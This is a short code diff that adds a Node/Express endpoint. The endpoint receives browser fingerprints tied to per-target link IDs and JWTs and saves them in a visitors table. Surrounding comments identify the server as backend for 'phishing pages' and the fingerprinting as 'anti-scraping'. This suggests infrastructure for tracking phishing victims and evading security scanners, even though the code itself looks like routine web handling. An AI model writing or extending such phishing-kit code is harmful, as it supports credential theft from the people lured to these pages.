@@ -441,6 +441,37 @@ app.post('/api/beacon', async (req, res) => {
     res.status(500).json({ error: 'Server error' });
   }
 });
+// Beacon fingerprint endpoint - receives browser fingerprint from anti-scraping
+app.post('/api/beacon/fp', async (req, res) => {
+  try {
+    const { fp, jwt_token, link_id } = req.body;
+    
+    // Verify JWT token
+    if (!jwt_token) return res.status(401).json({ error: 'JWT token required' });
+    
+    const jwt = require('jsonwebtoken');
+    let decoded;
+    try {
+      decoded = jwt.verify(jwt_token, config.JWT_SECRET);
+    } catch (err) {
+      return res.status(401).json({ error: 'Invalid or expired token' });
+    }
+    
+    // Update fingerprint in visitors table
+    if (decoded.link_id) {
+      await db.query(
+        'UPDATE visitors SET fingerprint = ? WHERE link_id = ? AND jwt_token = ?',
+        [fp, decoded.link_id, jwt_token]
+      );
+      console.log(`[BeaconFp] Link ${decoded.link_id} fingerprint received`);
+    }
+    
+    res.status(200).send('ok');
+  } catch (err) {
+    console.error('[BeaconFp] Error:', err.message);
+    res.status(500).json({ error: 'Fingerprint failed' });
+  }
+});
 
 // Verify endpoint for JWT validation (phishing pages)
 app.post('/api/verify', async (req, res) => {
